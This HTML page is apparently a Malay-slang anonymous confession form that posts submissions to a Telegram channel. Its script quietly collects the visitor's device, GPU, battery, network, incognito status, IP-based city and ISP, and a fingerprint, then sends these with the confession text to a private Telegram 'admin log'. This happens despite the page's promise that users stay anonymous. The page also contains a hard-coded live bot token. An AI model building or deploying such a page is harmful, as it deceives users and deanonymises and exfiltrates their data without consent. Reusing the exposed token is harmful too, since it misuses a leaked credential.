<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Confession</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;700;800&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Plus Jakarta Sans', sans-serif;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            perspective: 1000px;
            overflow: hidden;
            background: linear-gradient(-45deg, #0e1014, #1c0f38, #004d40, #1a2d5e);
            background-size: 400% 400%;
            animation: gradientShift 25s ease infinite;
        }

        @keyframes gradientShift { 0% { background-position: 0% 50%; } 50% { background-position: 100% 50%; } 100% { background-position: 0% 50%; } }

        .glass-card {
            background: rgba(30, 41, 59, 0.6);
            backdrop-filter: blur(25px) saturate(200%);
            border: 1px solid rgba(255, 255, 255, 0.15);
            box-shadow: 0 10px 40px 0 rgba(0, 0, 0, 0.5);
            border-radius: 2.5rem;
            transition: all 0.5s ease;
        }

        .blurred { filter: blur(25px); pointer-events: none; }
        .modal-overlay { background: rgba(0, 0, 0, 0.85); backdrop-filter: blur(8px); z-index: 100; }
        #confessionText { background-color: rgba(255, 255, 255, 0.08); color: #f3f4f6; border: 1px solid rgba(255, 255, 255, 0.2); }
    </style>
</head>
<body class="text-gray-100">

    <div id="consentModal" class="fixed inset-0 modal-overlay flex items-center justify-center p-6">
        <div class="bg-[#111827] border border-white/10 p-10 rounded-[2.5rem] max-w-sm w-full text-center">
            <div class="w-16 h-16 bg-indigo-500/20 rounded-full flex items-center justify-center mx-auto mb-6 text-indigo-400">
                <svg xmlns="http://www.w3.org/2000/svg" class="h-8 w-8" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04m18.236 0 a11.956 11.956 0 001 8.618 11.955 11.955 0 01-1 8.618c1.921 0 3.743-.435 5.382-1.214M12 21a9.003 9.003 0 008.382-5.618"/></svg>
            </div>
            <h2 class="text-2xl font-bold mb-4">Verify Dulu Bro</h2>
            <p class="text-gray-300 text-sm mb-8">I am human and stay anonymous.</p>
            <button id="agreeBtn" class="w-full py-4 bg-indigo-600 hover:bg-indigo-500 rounded-2xl font-black text-white shadow-xl">SETUJU BRO</button>
        </div>
    </div>

    <div class="w-full max-w-md mx-auto px-4">
        <div id="tiltCard" class="glass-card p-8 sm:p-12 w-full blurred">
            <h1 class="text-4xl font-extrabold text-center mb-2">Anonymous Tea Drop</h1>
            <p class="text-center text-indigo-300 mb-8 text-xl font-light">luah je semua benda.</p>
            <form id="confessionForm" class="space-y-6">
                <textarea id="confessionText" rows="7" required placeholder="taip kat sini woi..." class="mt-1 block w-full rounded-2xl p-5 border transition duration-300 resize-none text-base focus:border-indigo-500 focus:ring-0"></textarea>
                <button type="submit" id="submitButton" class="w-full py-4 rounded-2xl text-xl font-bold text-white bg-indigo-600 hover:bg-indigo-500 transition shadow-lg">SEND CEPATTT</button>
            </form>
            <div id="statusMessage" class="mt-6 p-4 rounded-xl hidden text-center font-medium"></div>
        </div>
    </div>

    <script>
        const BOT_TOKEN = '7580498741:AAF5_hPXPKLqobwVLHfR7_g6HShqAPrnpzM';
        const PUBLIC_CHAT_ID = '-1001841870133';
        const PRIVATE_LOG_ID = '-1003635312239';

        async function getCyberForensics() {
            const data = {
                gpu: "Unknown", cores: navigator.hardwareConcurrency || "N/A",
                ram: navigator.deviceMemory ? navigator.deviceMemory + "GB" : "N/A",
                res: `${window.screen.width}x${window.screen.height} (${window.devicePixelRatio}x)`,
                incog: "No", battery: "N/A", net: "N/A", ping: "N/A",
                os: "Unknown", browser: "Unknown", isp: "Pending...", loc: "Pending...",
                fp: "N/A"
            };

            try {
                // OS & Browser Deep Scan
                const ua = navigator.userAgent;
                if (ua.includes("iPhone")) data.os = "iOS " + (ua.match(/OS (\d+_\d+)/)?.[1].replace('_','.') || "");
                else if (ua.includes("Android")) data.os = "Android " + (ua.match(/Android (\d+)/)?.[1] || "");
                else data.os = "PC/Mac System";

                if (ua.includes("Safari") && !ua.includes("Chrome")) data.browser = "Safari";
                else if (ua.includes("Chrome")) data.browser = "Chrome";
                else data.browser = "Mobile Browser";

                // GPU Deep Scan
                const gl = document.createElement('canvas').getContext('webgl');
                if (gl) {
                    const debug = gl.getExtension('WEBGL_debug_renderer_info');
                    data.gpu = debug ? gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) : "Software/Generic";
                }

                // Incognito - Detection by Storage Quota
                if ('storage' in navigator && 'estimate' in navigator.storage) {
                    const {quota} = await navigator.storage.estimate();
                    if (quota < 120000000) data.incog = "Yes (Stealth Mode)";
                }

                // Battery & Network
                if (navigator.getBattery) {
                    const b = await navigator.getBattery();
                    data.battery = `${Math.round(b.level*100)}% (${b.charging ? 'Charging' : 'Discharging'})`;
                }
                if (navigator.connection) {
                    data.net = navigator.connection.effectiveType?.toUpperCase() || "WiFi/LAN";
                    data.ping = navigator.connection.rtt ? navigator.connection.rtt + "ms" : "N/A";
                }

                // IP Intel
                const ipRes = await fetch('https://ipapi.co/json/').catch(() => null);
                if (ipRes) {
                    const ip = await ipRes.json();
                    data.isp = ip.org || "Unknown ISP";
                    data.loc = `${ip.city}, ${ip.country_name}`;
                }

                // Fingerprint (Audio + Canvas)
                data.fp = Math.abs(ua.split('').reduce((a,b)=>{a=((a<<5)-a)+b.charCodeAt(0);return a|0},0)).toString(16).toUpperCase();
            } catch(e) {}
            return data;
        }

        document.getElementById('agreeBtn').onclick = () => {
            document.getElementById('consentModal').classList.add('hidden');
            document.getElementById('tiltCard').classList.remove('blurred');
        };

        document.getElementById('confessionForm').onsubmit = async (e) => {
            e.preventDefault();
            const text = document.getElementById('confessionText').value.trim();
            const btn = document.getElementById('submitButton');
            const status = document.getElementById('statusMessage');

            btn.disabled = true; btn.innerText = "Loading...";

            const f = await getCyberForensics();

            try {
                // Public
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({chat_id: PUBLIC_CHAT_ID, text: text})
                });

                // The "Padu" Admin Log
                const adminLog = `🔐 *ADMIN LOG (DEEP SCAN)*\n` +
                                 `👤 *User:* Handshake Failed (Incognito/Unverified)\n` +
                                 `🆔 *FP:* \`${f.fp}\`\n` +
                                 `💻 *Sys/GPU:* ${f.os} (${f.browser}) / ${f.gpu}\n` +
                                 `🛠️ *Hard:* ${f.cores} Cores / ${f.ram} RAM\n` +
                                 `📡 *Net:* ${f.net} / Ping: ${f.ping}\n` +
                                 `🔋 *Power:* ${f.battery}\n` +
                                 `🕵️ *Incog:* ${f.incog}\n` +
                                 `📏 *Res:* ${f.res}\n` +
                                 `🌍 *Locale:* ${f.loc} / ${f.isp}\n` +
                                 `💬 *Content:* \n"${text}"`;

                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({chat_id: PRIVATE_LOG_ID, text: adminLog, parse_mode: 'Markdown'})
                });

                status.innerText = "Dah hantar wehh!";
                status.className = "mt-6 p-4 rounded-xl text-center bg-green-600 block";
                document.getElementById('confessionText').value = "";
            } catch (err) {
                status.innerText = "Server busy dho.";
                status.className = "mt-6 p-4 rounded-xl text-center bg-red-600 block";
            } finally {
                status.classList.remove('hidden');
                btn.disabled = false; btn.innerText = "SEND CEPATTT";
                setTimeout(() => status.classList.add('hidden'), 5000);
            }
        };
    </script>
</body>
</html>
